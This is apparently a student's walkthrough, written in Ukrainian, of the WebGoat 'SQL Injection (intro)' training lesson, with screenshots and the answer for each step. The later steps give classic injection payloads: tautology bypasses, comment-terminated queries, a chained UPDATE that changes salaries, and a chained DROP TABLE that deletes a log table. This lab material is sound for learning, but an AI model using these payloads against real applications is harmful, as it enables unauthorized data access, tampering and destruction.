# SQLI(intro)

Обираємо відповідне завдання з меню WebGoat.

## Проходження завдання

![](Screenshot_2026-07-23_11-40-09.png)

### What is SQL?

![](Screenshot_2026-07-23_11-41-53.png)

Запит для розв'язання завдання:

```
SELECT department FROM employees WHERE first_name = 'Bob' AND last_name = 'Franco';
```

### Data Manipulation Language (DML)

![](Screenshot_2026-07-23_11-42-43.png)

Запит для розв'язання завдання:

```
UPDATE employees SET department = 'Sales' WHERE first_name = 'Tobi' AND last_name = 'Barnett';
```

### Data Definition Language (DDL)

![](Screenshot_2026-07-23_11-43-18.png)

Запит для розв'язання завдання:

```
ALTER TABLE employees ADD phone varchar(20);
```

### Data Control Language (DCL)

![](Screenshot_2026-07-23_11-43-54.png)

Запит для розв'язання завдання:

```
GRANT ALL ON grant_rights TO unauthorized_user;
```

### What is SQL injection?

![](Screenshot_2026-07-23_11-44-12.png)

### Consequences of SQL injection

![](Screenshot_2026-07-23_11-44-16.png)

### Severity of SQL injection

![](Screenshot_2026-07-23_11-44-20.png)

### Try It! String SQL injection

![](Screenshot_2026-07-23_11-44-52.png)

Запит для розв'язання завдання:

```
Smith'
```

```
or
```

```
'1'='1
```

### Try It! Numeric SQL injection

![](Screenshot_2026-07-23_11-45-22.png)

Запит для розв'язання завдання:

```
1
```

```
1 OR '1'='1'
```

### Compromising confidentiality with String SQL injection

![](Screenshot_2026-07-23_11-47-50.png)

Запит для розв'язання завдання:

```
Smith' OR '1'='1' --
```

### Compromising Integrity with Query chaining

![](Screenshot_2026-07-23_11-48-46.png)

Запит для розв'язання завдання:

```
Smith'; UPDATE employees SET salary = '999999' WHERE last_name = 'Smith' --
```

### Compromising Availability

![](Screenshot_2026-07-23_11-49-11.png)

```
Smith'; DROP TABLE access_log --
```

Завдання виконано успішно.

![](Screenshot_2026-07-23_11-49-16.png)
